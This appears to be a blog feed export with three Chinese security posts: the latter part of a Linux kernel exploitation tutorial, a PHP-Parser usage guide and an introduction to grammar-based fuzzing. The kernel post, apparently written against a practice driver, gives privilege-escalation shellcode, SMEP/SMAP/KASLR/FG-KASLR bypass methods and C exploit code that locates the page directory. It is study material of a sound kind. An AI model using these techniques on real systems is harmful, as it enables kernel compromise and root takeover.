不过要记得，/flag字符串存放地址应该使用内核空间地址，同时由于Linux kernel本身采用的是Non-Preemptive Threading Model，因此在kernel thred的执行过程中一般不会进行上下文切换，除非调用了特殊的API，通过sleep当前thread其实就是一个很好的迫使kernel进行上下文切换的，当然kernel里面的sleep和用户态有很大的差别，需要调用不同的API，这里我选择的是msleep():

那么，完整的shellcode就有了：
; commit_cred(prepare_kernel_creds(0))
xor rdi, rdi
mov rcx, prepare_kernel_cred_addr
call rcx
mov rdi, rax
mov rcx, commit_creds_addr
call rcx

; chmod 777 flag
mov r15, 0x67616c662f
mov r14, 0xdeadf00
mov [r14], r15
mov rdi, 0xffffff9c
mov rsi, r14
mov rdx, 0777
mov rcx, x64_chmod_addr
call rcx

; msleep(0x1000000)
mov rdi, 0x1000000
mov rcx, msleep_addr
call rcx
int 3

然后我们让exp在后台执行，前台执行cat flag实现文件读取。
总结​        在通过ROP编写shellcode的时候要注意两点：

在exp中的mmap产生的shellcode地址不在之前kernel访问的页表里面，那么在执行的时候就会触发double fault。
栈指针必须在向上向下两个方向上都还剩比较宽阔的空间unsigned long *pivot_stack = mmap((void *)0xf7000000-0x1000, 0x1000+0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);，因为Linux kernel func 比如 commit_creds需要使用栈空间并且不能使用低于0xf7000000大小的地址，否则会引起uncatchable page fault，MAP_GROWSDOWN是无效的，因为它只能用于用户态。

SMEP+PTI+SMAP+KASLR bypass
KASLR就不多解释了，就是一个kernel的地址随机化

SMAP​        SMAP是Supervisor Mode Access Prevention，它使得用户态的指针无法在内核态被解引用，这无疑会使得ROP难以有效使用。
​        在qemu里面-cpu kvm64,smep,smap表明开启了SMAP机制，当然cat /proc/cpuinfo | grep smap也可以看出来。
SMAP bypass​        通过分析linux kernel的mmap实现其实就可以知道我们可以通过类似linux kernel heap spray的方式将用户空间的代码映射到内核里面，只需要用MAP_POPULATE的flag:
       MAP_POPULATE (since Linux 2.5.46)
              Populate (prefault) page tables for a mapping.  For a file mapping, this causes read-ahead on the file.  This will help to reduce blocking on page faults later.  The mmap() call doesn't fail if the mapping cannot be populated (for example, due to limitations on the number of mapped huge pages when using MAP_HUGETLB).  MAP_POPULATE is supported for private mappings only since Linux 2.6.23.

这是因为在通过该flag进行mmap的时候，物理页也会同时被映射而不是想之前按需映射的方式。下面是一个github提供的demo可以测算可mmap的地址大小：
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/fcntl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/stat.h&gt;

int main (int argc, char **argv){
    int cnt = 0;
    void *pg;

    while(1) {
        pg = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        if (pg == MAP_FAILED) {
            perror("mmap");
            break;
        }
        else {
            cnt++;
            if (cnt % 1000 == 0) {
                printf("[*] allocated %d pages, asking for more...\n", cnt);
            }
        }
    }

    printf("[*] number of pages allocated: %d\n", cnt);
    return 0;
}

通过实验得出结论就是尽管RAM很小，但是最大mmap的值是它的数倍，同时该值会根据内存资源的大小来发生变化。同时物理页的分配有一个特点，那就是它们一般都是连续分配的。如此通过大量的mmap地址并填充信息，最终其实是可以在内核里面访问到这些信息的，如此就可以绕过SMAP的保护，因为我们不需要再解析用户态的指针，而是通过内核地址进行代码执行。
​        那么应该如何获得物理地址呢？通过文档发现，在Linux中每一个进程都维护一个指针mm_struct-&gt;pgd指向该进程的**Page Global Directory (PGD)**，表里面包含的是pgd_t数组，pgd_t定义在asm/page.h里面根据不同的架构拥有不同的值，在x86架构下mm_struct-&gt;pgd会被复制到cr3寄存器。

​        可以知道通过mmap拿到的是虚拟地址，因此需要做一个虚拟地址到屋里地址之间的转换，那么如何获取cr3或者说pgd的值呢，一方面可以通过内核获取另一方面可以通过/proc/(pid)/pagemap获取，还有一种很奇特的方法即是通过映射64bit的[39:48]形成的地址，这里一共是0xff个地址，此时在物理页表中就会生成大量稠密的地址，这些地址会有一些特征，比如：

最高位为1。
最低字节为0x67。

那么就可以通过遍历内核地址（一般从pageOffsetBase + (0x7c000 &lt;&lt; 12)开始）中的值来判断是否符合自己刚才通过spraying注入的大量地址，如果一个地址的内容符合自己注入的地址，同时索引0x100的结果为0，那么基本就能确定PGD的地址了。
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/fcntl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;string.h&gt;

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333
#define VULN_PGD 0x4444
#define VULN_PB 0x5555

#define SPRAY_CNT 0x10000

struct rwRequest {
    void *kaddr;
    void *uaddr;
    size_t length;
};

unsigned long pageOffsetBase = 0xffff888000000000;

int Open(char *fname, int mode) {
    int fd;
    if ((fd = open(fname, mode)) &lt; 0) {
        perror("open");
        exit(-1);
    }
    return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

    struct rwRequest req;
    unsigned long value_ = value;

    req.uaddr = &amp;value_;
    req.length = 8;
    req.kaddr = (void *)kaddr;

    int fd = Open("/dev/vuln", O_RDONLY);

    if (ioctl(fd, VULN_WRITE, &amp;req) &lt; 0) {
        perror("ioctl");
        exit(-1);
    }
}

unsigned long read64(unsigned long kaddr) {

    struct rwRequest req;
    unsigned long value;;

    req.uaddr = &amp;value;
    req.length = 8;
    req.kaddr = (void *)kaddr;

    int fd = Open("/dev/vuln", O_RDONLY);

    if (ioctl(fd, VULN_READ, &amp;req) &lt; 0) {
        perror("ioctl");
        exit(-1);
    }

    close(fd);

    return value;
}

unsigned long leak_stack() {
    struct rwRequest req;
    unsigned long stack;

    int fd = Open("/dev/vuln", O_RDONLY);

    req.uaddr = &amp;stack;
    if (ioctl(fd, VULN_STACK, &amp;req) &lt; 0) {
        perror("ioctl");
        exit(-1);
    }

    close(fd);

    return stack;
}

unsigned long leak_pgd() {
    struct rwRequest req;
    unsigned long pgd = 0xcccccccc;

    int fd = Open("/dev/vuln", O_RDONLY);

    req.uaddr = &amp;pgd;
    if (ioctl(fd, VULN_PGD, &amp;req) &lt; 0) {
        perror("ioctl");
        exit(-1);
    }

    close(fd);

    return pgd;
}

unsigned long leak_physmap_base() {
    struct rwRequest req;
    unsigned long pgd = 0xcccccccc;

    int fd = Open("/dev/vuln", O_RDONLY);

    req.uaddr = &amp;pgd;
    if (ioctl(fd, VULN_PB, &amp;req) &lt; 0) {
        perror("ioctl");
        exit(-1);
    }

    close(fd);

    return pgd;
}

int check_page(unsigned long addr) {

    unsigned long page[0x101];

    for (int i = 0; i &lt; 0x101; i++) {
        page[i] = read64(addr + i*8);
    }
    for (int i = 0; i &lt; 0x100; i++) {
        if (((page[i] &amp; 0xff) != 0x67) || (!(page[i] &gt;&gt; 63))) {
            return 0;
        }
    }

    return page[0x100] == 0;
}

int main (int argc, char **argv){

    void *pg;
    unsigned long search_addr;
    
    search_addr = pageOffsetBase + (0x7c000 &lt;&lt; 12);
    
    for (unsigned long i = 1; i &lt; 0x100; i++) {
        pg = mmap((void *)(i &lt;&lt; 39), 0x1000, PROT_READ|PROT_WRITE, MAP_POPULATE|MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
        if (pg == MAP_FAILED) {
            perror("mmap");
            exit(-1);
        }
    }

    printf("[*] starting search from addr %p\n", (void *)search_addr);
    
    while(1) {
        if (check_page(search_addr)) {
            printf("[+] located the PGD: %p\n", (void *)search_addr);
            break;
        }
        search_addr += 0x1000;
    }

    printf("[*] this is the actual PGD: %p\n", (void *)leak_pgd());
    
    return 0;
}

​        如此可以在用户空间通过大量的mmap，然后拿到其物理地址，然后通过内核态的地址转换将该物理地址转换为内核的虚拟地址通过kernel module进行读取就会发现内核可以读取到用户态的数据。
​        如此就知道绕过的原理了，总结一下就是通过内核空间和用户空间确定相同的物理页然后让kernel进行代码执行。
KASLR bypass​        KASLR其实就是内核态的地址随机化，类似用户态的做法，bypass可以通过确定基地址然后加上固定偏移来解决。但是观察/proc/kallsyms的内容发现一些符号其实是完全自己在随机，而不是拥有一个固定的偏移，这就引出了Linux Kernel的一个机制Function Granular KASLR，简单来说就是内核在加载的时候会以函数级别重新排布内核代码。
​        但是FG-KASLR并不完善，一些内核区域并不会随机化：

不幸，commit_creds 和 prepare_kernel_cred在FG-KASLR的区域。
swapgs_restore_regs_and_return_to_usermode和__x86_retpoline_r15函数不受到FG-KASLR影响，这能帮助找到一些gadget。
内核符号表ksymtab不受影响，这里存储了一些偏移可以用于计算prepare_kernel_cred和commit_creds的地址。

​        第三个比较感兴趣：
struct kernel_symbol {
      int value_offset;
      int name_offset;
      int namespace_offset;
};

可以看出value_offset应该是比较有趣的，这个对应的值也可以通过/proc/kallsyms获取：

因此一般就可以在ROP中利用任意读读出相对应的偏移用于计算其它函数的具体位置。
总结​        网上看到一段总结，感觉很不错：

如果内核没有保护，就直接ret2usr。
如果开了SMEP，就用ROP
溢出或者位置被限制在栈上，就用pivot gadget进行栈迁移。
KPTI利用KPTI trampoline或者signal handler
SMAP会导致stack pivot很难利用
如果没有KASLR，直接泄露地址就能用，开了的话就用基地址 + 偏移。
如果有FG-KASLR，记得利用ksymtab和不受影响的区域。

参考链接
https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/
https://github.com/pr0cf5/kernel-exploit-practice

]]></content>
      <categories>
        <category>Linux Kernel</category>
      </categories>
      <tags>
        <tag>Linux Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-Parser的基本使用</title>
    <url>//post/PHP-Parser.html</url>
    <content><![CDATA[PHP-ParserPHP-Parser组件的基础使用，该组件为静态分析和反混淆常用的第三方依赖。


What is PHP-ParserPHP-Parser是nikic用PHP编写的PHP5.2到PHP7.4解析器，其目的是简化静态代码分析和操作
PHP-Parser的基础使用这里先贴一下官方文档
PHP-Parser/doc at master · nikic/PHP-Parser (github.com)
最基本的是要理解其中Walking the AST的部分
初始化解析器首先创建实例
use PhpParser\ParserFactory;
$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);

这其中有以下参数
KindBehaviorParserFactory::PREFER_PHP7Try to parse code as PHP 7. If this fails, try to parse it as PHP 5.ParserFactory::PREFER_PHP5Try to parse code as PHP 5. If this fails, try to parse it as PHP 7.ParserFactory::ONLY_PHP7Parse code as PHP 7.ParserFactory::ONLY_PHP5Parse code as PHP 5.
create还有一个参数Lexer，这里先不做讨论
在实例化之后我们就可以通过
$stmts = $parser-&gt;parse($code);

来将代码转换成AST
为了防止抛出异常，最好在try….catch中执行
生成更加直观的AST当我们var_dump上面的$stmt时，会得到一个比较乱的AST，可以使用NodeDump将其转化为更加直观的AST
这里需要使用NodeDump
对于代码
&lt;?php
function printLine($msg) {
    echo $msg, "\n";
}
printLine('Hello World!!!');

将其转换为AST
&lt;?php
use PhpParser\NodeDumper;
$nodeDumper = new NodeDumper;echo $nodeDumper-&gt;dump($stmts), "\n";

得到以下输出
array(
    0: Stmt_Function(
        byRef: false
        name: Identifier(
            name: printLine
        )
        params: array(
            0: Param(
                type: null
                byRef: false
                variadic: false
                var: Expr_Variable(
                    name: msg
                )
                default: null
            )
        )
        returnType: null
        stmts: array(
            0: Stmt_Echo(
                exprs: array(
                    0: Expr_Variable(
                        name: msg
                    )
                    1: Scalar_String(
                        value:

                    )
                )
            )
        )
    )
    1: Stmt_Expression(
        expr: Expr_FuncCall(
            name: Name(
                parts: array(
                    0: printLine
                )
            )
            args: array(
                0: Arg(
                    value: Scalar_String(
                        value: Hello World!!!
                    )
                    byRef: false
                    unpack: false
                )
            )
        )
    )
)

Node tree structure上面我们可以看到生成了很多的Node类型
PHP是一个成熟的脚本语言，它大约有140个不同的节点。但是为了方便使用，将他们分为三类：

PhpParser\Node\Stmts是语句节点，即不返回值且不能出现在表达式中的语言构造。例如，类定义是一个语句，它不返回值，你不能编写类似func(class {})的语句。

PhpParser\Node\expr是表达式节点，即返回值的语言构造，因此可以出现在其他表达式中。如：$var (PhpParser\Node\Expr\Variable)和func() (PhpParser\Node\Expr\FuncCall)。

PhpParser\Node\Scalars是表示标量值的节点，如"string" (PhpParser\Node\scalar\string)、0 (PhpParser\Node\scalar\LNumber) 或魔术常量，如”FILE“ (PhpParser\Node\scalar\MagicConst\FILE) 。所有PhpParser\Node\scalar都是延伸自PhpParser\Node\Expr，因为scalar也是表达式。

需要注意的是PhpParser\Node\Name和PhpParser\Node\Arg不在以上的节点之中


Pretty printerPrettyprinter用来将我们修改后的AST转换回PHP代码，使用如下
use PhpParser\Error;
use PhpParser\ParserFactory;
use PhpParser\PrettyPrinter;
$code = "&lt;?php echo 'Hi ', hi\\getTarget();";
$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);$prettyPrinter = new PrettyPrinter\Standard;
try {
    //生成AST
    $stmts = $parser-&gt;parse($code);
    //对节点进行操作
    $stmts[0]         // the echo statement
          -&gt;exprs     // sub expressions
          [0]         // the first of them (the string node)
          -&gt;value     // it's value, i.e. 'Hi '
          = 'Hello '; // change to 'Hello '

    // pretty print
    $code = $prettyPrinter-&gt;prettyPrint($stmts);
    echo $code;
} catch (Error $e) {
    echo 'Parse Error: ', $e-&gt;getMessage();
}

在反混淆中我们一般很少使用$stmts[0]这种方式，因为我们要考虑节点的各种类型
此外还有prettyPrintExpr()，它可以用来输出一个表达式类型的节点
例如当你需要提取全局变量时
&lt;?php
    $a = $_POST['a'];

他的语法树如下
0: Stmt_Expression(
        expr: Expr_Assign(
            var: Expr_Variable(
                name: a
            )
            expr: Expr_ArrayDimFetch(
                var: Expr_Variable(
                    name: _POST
                )
                dim: Scalar_String(
                    value: a
                )
            )
        )
    )

如果我想获取$_POST[‘a’],我就需要先判断节点类型是不是Expr_ArrayDimFetch
然后判断$node-&gt;var-&gt;name是不是全局变量
最后提取$node-&gt;var-&gt;name和$node-&gt;dim-&gt;value然后将它们拼接
当我的全局变量为$_POST[a]时，dim部分的AST也会变化，我们还需要考虑这种情况。
但是我们可以使用
/*
    用来识别全局变量;
    如果要获取全局变量格式无需考虑value的节点类型
    expr: Expr_ArrayDimFetch(
            var: Expr_Variable(
                name: _POST
            )
    )
*/
        if ($node instanceof Node\Expr\ArrayDimFetch &amp;&amp; $node-&gt;var instanceof Node\Expr\Variable &amp;&amp; (in_array($node-&gt;var-&gt;name ,GLOBAL_VAR)))
        {
            self::$globalname = $this-&gt;prettyPrinter-&gt;prettyPrintExpr($node);
        }

其中
$this-&gt;prettyPrinter-&gt;prettyPrintExpr($node);

就会返回该Expr节点的表达式，无论是$_POST['a']还是$_POST[a]都可以正常返回
PHP-Parser/Pretty_printing.markdown at master · nikic/PHP-Parser (github.com)
Node traversation我们使用PHP-Parser对文件的节点进行修改，最关键的就是编写节点遍历操作
使用PhpParser\NodeTraverser我们可以遍历每一个节点，举几个简单的例子：解析php中的所有字符串，并输出
&lt;?php
use PhpParser\Error;
use PhpParser\ParserFactory;
use PhpParser\NodeTraverser;
use PhpParser\NodeVisitorAbstract;
use PhpParser\Node;

require 'vendor/autoload.php';

class MyVisitor extends NodeVisitorAbstract{
    public function leaveNode(Node $node)
    {
        //判断如果是一个String_节点，就输出
        if ($node instanceof Node\Scalar\String_)
        {
            echo $node -&gt; value,"\n";
        }

    }
}

$code = file_get_contents("./test.php");

//实例化解释器
$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);
$traverser = New NodeTraverser;
//添加自己的Visitor
$traverser-&gt;addVisitor(new MyVisitor);

try {
    //转化AST
    $ast = $parser-&gt;parse($code);
    //开始遍历
    $stmts = $traverser-&gt;traverse($ast);
} catch (Error $error) {
    echo "Parse error: {$error-&gt;getMessage()}\n";
    return;
}

?&gt;

替换php脚本中函数以及类的成员方法函数名为小写
class MyVisitor extends NodeVisitorAbstract{
    public function leaveNode(Node $node)
    {
        if( $node instanceof Node\Expr\FuncCall) {
            $node-&gt;name-&gt;parts[0]=strtolower($node-&gt;name-&gt;parts[0]);
        }elseif($node instanceof Node\Stmt\ClassMethod){
            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);
        }elseif ($node instanceof Node\Stmt\Function_){
            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);
        }elseif($node instanceof Node\Expr\MethodCall){
            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);
        }
    }
}

需要注意的是所有的visitors都必须实现PhpParser\NodeVisitor接口，该接口定义了如下4个方法：
public function beforeTraverse(array $nodes);
public function enterNode(\PhpParser\Node $node);
public function leaveNode(\PhpParser\Node $node);
public function afterTraverse(array $nodes);


beforeTraverse方法在遍历开始之前调用一次，并将其传递给调用遍历器的节点。此方法可用于在遍历之前重置值或准备遍历树。

afterTraverse方法与beforeTraverse方法类似，唯一的区别是它只在遍历之后调用一次。

在每个节点上都调用enterNode和leaveNode方法，前者在它被输入时，即在它的子节点被遍历之前，后者在它被离开时。

这四个方法要么返回更改的节点，要么根本不返回(即null)，在这种情况下，当前节点不更改。


例子基于 AST（抽象语法树）解 PHP 混淆 | J0k3r’s Blog
P.S.我们需要知道你需要什么样的Node，进行什么样的操作，Node下数据的格式会有哪几种情况，会不会因为代码不够严谨导致错误或者无限递归
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzzing之Grammars</title>
    <url>//post/Fuzzing%E4%B9%8BGrammers.html</url>
    <content><![CDATA[Fuzzing之GrammarsFuzzing input​  Fuzzing的一大核心思想其实就是通过大量的Input去触发程序的各个分支逻辑，因此Fuzzing的成功与否和Input的生成关系密切。Input的格式多种多样，可以是文件，代码，json数据等等。但是各种各样的数据都有自己的格式，程序的输入也是如此，那么在生成Input的过程中，格式化非常关键，程序无法接受的输入对于Fuzzing来说是毫无意义的。
​  为了很好的描述一个程序的输入，一个很有必要的事情是为输入制定一些语法规范。比如编译器的输入：python解释器规定了符合python语法的程序才能得以执行，gcc规定了符合C语言语法的程序才能被完成编译进而生成二进制文件。Fuzzing也是如此，为了很好的达到Fuzzing的效果，为程序定义一种输入的语法规范往往是一种不错的选择。
​  一般而言，对于Fuzzing简单的程序来说，正则表达式往往是一个不错的选择，它所具备的有限状态机属性使得它易于推理进而获得一个满意的Input。但是如果面临的Fuzzing目标需要非常复杂的输入，那么它就会表现的捉襟见肘。
​  我曾见过为了更好的实现某些功能而专门设计一些语言，从计算机理论的角度这显然是非常有用的，一些特殊功能在特殊语言的加持之下表现出超高的质量，但是对于Fuzzing而言这确实是成本过高了，Grammars其实就是正则表达式和专业语言之间的一个中间地带。它易于理解，并且能很好的完成Fuzzing对它的期望–生成大量合法输入，因为通过Grammars可以规定Inputs的大量属性，完美的表达一个复杂输入的语法结构。
Grammars初探​  Grammar一般由符号和一组表达式组成，例如A = 10 | 9 | 0 |1，符号化使得递归成为可能，假设B = A | AB，这无疑就使得符号所代表的范围倍增。根据这种思想我们可以制作一个算数表达式：
&lt;start&gt;   ::= &lt;expr&gt;
&lt;expr&gt;    ::= &lt;term&gt; + &lt;expr&gt; | &lt;term&gt; - &lt;expr&gt; | &lt;term&gt;
&lt;term&gt;    ::= &lt;term&gt; * &lt;factor&gt; | &lt;term&gt; / &lt;factor&gt; | &lt;factor&gt;
&lt;factor&gt;  ::= +&lt;factor&gt; | -&lt;factor&gt; | (&lt;expr&gt;) | &lt;integer&gt; | &lt;integer&gt;.&lt;integer&gt;
&lt;integer&gt; ::= &lt;digit&gt;&lt;integer&gt; | &lt;digit&gt;
&lt;digit&gt;   ::= 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9

那么通过对&lt;start&gt;的内部的符号进行逐一扩展，并对过程进行随机化处理，最终就可以得到大量的合法算数表达式。和大多数语法一样，Grammar也应该有自己的Type，以便对其合法性进行校验，以Python 为例子可以对上述的Grammar进行定义：
    Option = Dict[str, Any]
    Expansion = Union[str, Tuple[str, Option]]
    Grammar = Dict[str, List[Expansion]]
    EXPR_GRAMMAR: Grammar = {
        "&lt;start&gt;":
            ["&lt;expr&gt;"],

        "&lt;expr&gt;":
            ["&lt;term&gt; + &lt;expr&gt;", "&lt;term&gt; - &lt;expr&gt;", "&lt;term&gt;"],

        "&lt;term&gt;":
            ["&lt;factor&gt; * &lt;term&gt;", "&lt;factor&gt; / &lt;term&gt;", "&lt;factor&gt;"],

        "&lt;factor&gt;":
            ["+&lt;factor&gt;",
            "-&lt;factor&gt;",
            "(&lt;expr&gt;)",
            "&lt;integer&gt;.&lt;integer&gt;",
            "&lt;integer&gt;"],

        "&lt;integer&gt;":
            ["&lt;digit&gt;&lt;integer&gt;", "&lt;digit&gt;"],

        "&lt;digit&gt;":
            ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
    }

前三行代码定义了一个Grammar应该如何在Python中构成。通过代码中的EXPR_GRAMMAR["&lt;digit&gt;"]可以访问当前Grammar的各个组成部分并对其进行操作。
Sample Grammar Fuzz​  那么该如何对Grammar语法进行解析呢？一种最简单的方式就是通过字符串替换，因为在Grammar中:的左右两侧本身就是一种映射关系，因此利用字符串替换不断迭代是一种最为直观的选择。
实例代码：
START_SYMBOL = "&lt;start&gt;"
# 一个简单的gramar fuzzer
def simple_grammar_fuzzer(grammar: Grammar, 
                          start_symbol: str = START_SYMBOL,
                          max_nonterminals: int = 10,
                          max_expansion_trials: int = 100,
                          log: bool = False) -&gt; str:
    """Produce a string from `grammar`.
       `start_symbol`: use a start symbol other than `&lt;start&gt;` (default).
       `max_nonterminals`: the maximum number of nonterminals 
         still left for expansion
       `max_expansion_trials`: maximum # of attempts to produce a string
       `log`: print expansion progress if True"""

    term = start_symbol
    expansion_trials = 0

    while len(nonterminals(term)) &gt; 0: # 判断字符串中是否存在&lt;&gt;，并返回所有被&lt;&gt;包裹的项，注意如果是&lt;dsad&lt;abc&gt;&gt;则返回&lt;abc&gt;
        symbol_to_expand = random.choice(nonterminals(term))
        expansions = grammar[symbol_to_expand]
        expansion = random.choice(expansions)
        # In later chapters, we allow expansions to be tuples,
        # with the expansion being the first element
        if isinstance(expansion, tuple):
            expansion = expansion[0]

        new_term = term.replace(symbol_to_expand, expansion, 1) # 解析下一个符号

        if len(nonterminals(new_term)) &lt; max_nonterminals: # 每次的可解析符号，必须少于最大单次解析量
            term = new_term
            if log:
                print("%-40s" % (symbol_to_expand + " -&gt; " + expansion), term)
            expansion_trials = 0
        else:
            expansion_trials += 1
            if expansion_trials &gt;= max_expansion_trials: # 总的解析次数也存在限制
                raise ExpansionError("Cannot expand " + repr(term))

    return term

利用上面的表达式Grammar可以制作一个简单的grammar fuzz，Fuzz的编写过程其实面临着很多的取舍，便利和速度或者各种各样的可行性之间的考虑，以上面的Grammar为例子，我们肯定不希望其陷入类似无限递归或者大量符号解析的情况，而是会限制对字段的提取次数和对符号的解析次数。
​  但是此类Grammar Fuzz都面临几个问题就是大量的字符串搜索和替换操作导致效率低下，而且可以看出存在Input生成失败的情况（ExpansionError），而且这是一个典型的上下文无关的Fuzz。不过，依赖于上述功能，我们只要编写Grammar就可以很好的对一些Inputs进行大量生成。
比如URL生成：
URL_GRAMMAR: Grammar = {
    "&lt;start&gt;":
        ["&lt;url&gt;"],
    "&lt;url&gt;":
        ["&lt;scheme&gt;://&lt;authority&gt;&lt;path&gt;&lt;query&gt;"],
    "&lt;scheme&gt;":
        ["http", "https", "ftp", "ftps"],
    "&lt;authority&gt;":
        ["&lt;host&gt;", "&lt;host&gt;:&lt;port&gt;", "&lt;userinfo&gt;@&lt;host&gt;", "&lt;userinfo&gt;@&lt;host&gt;:&lt;port&gt;"],
    "&lt;host&gt;":  # 大部分情况下其实可以指定一个URL
        ["cispa.saarland", "www.google.com", "fuzzingbook.com"],
    "&lt;port&gt;":
        ["80", "8080", "&lt;nat&gt;"],
    "&lt;nat&gt;":
        ["&lt;digit&gt;", "&lt;digit&gt;&lt;digit&gt;"],
    "&lt;digit&gt;":
        ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],
    "&lt;userinfo&gt;":  # Just one
        ["user:password"],
    "&lt;path&gt;":  # Just a few
        ["", "/", "/&lt;id&gt;"],
    "&lt;id&gt;":  # Just a few
        ["abc", "def", "x&lt;digit&gt;&lt;digit&gt;"],
    "&lt;query&gt;":
        ["", "?&lt;params&gt;"],
    "&lt;params&gt;":
        ["&lt;param&gt;", "&lt;param&gt;&amp;&lt;params&gt;"],
    "&lt;param&gt;":  # Just a few
        ["&lt;id&gt;=&lt;id&gt;", "&lt;id&gt;=&lt;nat&gt;"],
}

或者类似HTTP协议的（但是这个不是为上述Fuzz准备的，只是拿来做个参考）：
{
    "&lt;A&gt;": [["&lt;START_LINE&gt;", "\r\n", "&lt;HEADERS&gt;", "&lt;BODY&gt;", "\r\n\r\n"]],
    
    "&lt;START_LINE&gt;": [["&lt;METHOD&gt;", " ", "&lt;URI&gt;", " ", "&lt;VERSION&gt;"]],
    
    "&lt;METHOD&gt;": [["GET"], ["HEAD"], ["POST"], ["PUT"], ["DELETE"], ["CONNECT"], ["OPTIONS"], ["TRACE"], ["PATCH"], ["ACL"], ["BASELINE-CONTROL"], ["BIND"], ["CHECKIN"], ["CHECKOUT"], ["COPY"], ["LABEL"], ["LINK"], ["LOCK"], ["MERGE"], ["MKACTIVITY"], ["MKCALENDAR"], ["MKCOL"], ["MKREDIRECTREF"], ["MKWORKSPACE"], ["MOVE"], ["ORDERPATCH"], ["PRI"], ["PROPFIND"], ["PROPPATCH"], ["REBIND"], ["REPORT"], ["SEARCH"], ["UNBIND"], ["UNCHECKOUT"], ["UNLINK"], ["UNLOCK"], ["UPDATE"], ["UPDATEREDIRECTREF"], ["VERSION-CONTROL"]],
    
    "&lt;URI&gt;": [["&lt;SCHEME&gt;" , ":", "&lt;HIER&gt;", "&lt;QUERY&gt;", "&lt;FRAGMENT&gt;"]],
    
    "&lt;SCHEME&gt;": [["http"], ["https"], ["shttp"], ["dav"], ["about"], ["attachment"], ["cid"], ["data"], ["file"], ["ftp"], ["ssh"], ["sip"]],
    
    "&lt;HIER&gt;": [["//", "&lt;AUTHORITY&gt;", "&lt;PATH&gt;"]],
    
    "&lt;AUTHORITY&gt;": [["&lt;USERINFO&gt;", "&lt;HOST&gt;"]],

    "&lt;PATH&gt;": [["/", "&lt;DIR&gt;"]],

    "&lt;DIR&gt;": [[], ["&lt;CHAR&gt;", "/", "&lt;DIR&gt;"]],
    
    "&lt;USERINFO&gt;": [[], ["&lt;CHAR&gt;", ":", "&lt;CHAR&gt;", "@"]],
    
    "&lt;HOST&gt;": [["127.0.0.1:8080"]],
    
    "&lt;QUERY&gt;": [[], ["?", "&lt;CHAR&gt;" , "=", "&lt;CHAR&gt;"]],
    
    "&lt;FRAGMENT&gt;": [[], ["#", "&lt;CHAR&gt;"]],

    "&lt;VERSION&gt;": [["HTTP/0.9"], ["HTTP/1.0"], ["HTTP/1.1"], ["HTTP/2.0"], ["HTTP/3.0"]],
    
    "&lt;HEADERS&gt;": [[], ["&lt;HEADER&gt;", "\r\n", "&lt;HEADERS&gt;"]],
    
    "&lt;HEADER&gt;": [["&lt;HEADER_FIELD&gt;", ": ", "&lt;ANY&gt;"]],
    
    "&lt;HEADER_FIELD&gt;": [["A-IM"], ["Accept"], ["Accept-Charset"], ["Accept-Datetime"], ["Accept-Encoding"], ["Accept-Language"], ["Access-Control-Request-Method"], ["Access-Control-Request-Headers"], ["Authorization"], ["Cache-Control"], ["Connection"], ["Content-Encoding"], ["Content-Length"], ["Content-MD5"], ["Content-Type"], ["Cookie"], ["Date"], ["Expect"], ["Forwarded"], ["From"], ["Host"], ["HTTP2-Settings"], ["If-Match"], ["If-Modified-Since"], ["If-None-Match"], ["If-Range"], ["If-Unmodified-Since"], ["Max-Forwards"], ["Origin"], ["Pragma"], ["Proxy-Authorization"], ["Range"], ["Referer"], ["TE"], ["Trailer"], ["Transfer-Encoding"], ["User-Agent"], ["Upgrade"], ["Via"], ["Warning"]],
    
    "&lt;BODY&gt;": [[], ["&lt;CHAR&gt;"]],
    
    "&lt;ANY&gt;": [[], ["&lt;DATE&gt;"], ["&lt;CHAR&gt;"], ["&lt;HOST&gt;"], ["&lt;URI&gt;"]],
    
    "&lt;DATE&gt;": [["Sat, 29 Oct 1994 19:43:31 GMT"]],
    
    "&lt;CHAR&gt;": [["0"], ["1"], ["2"], ["3"], ["4"], ["5"], ["6"], ["7"], ["8"], ["9"], ["a"], ["b"], ["c"], ["d"], ["e"], ["f"], ["g"], ["h"], ["i"], ["j"], ["k"], ["l"], ["m"], ["n"], ["o"], ["p"], ["q"], ["r"], ["s"], ["t"], ["u"], ["v"], ["w"], ["x"], ["y"], ["z"], ["A"], ["B"], ["C"], ["D"], ["E"], ["F"], ["G"], ["H"], ["I"], ["J"], ["K"], ["L"], ["M"], ["N"], ["O"], ["P"], ["Q"], ["R"], ["S"], ["T"], ["U"], ["V"], ["W"], ["X"], ["Y"], ["Z"]]
}

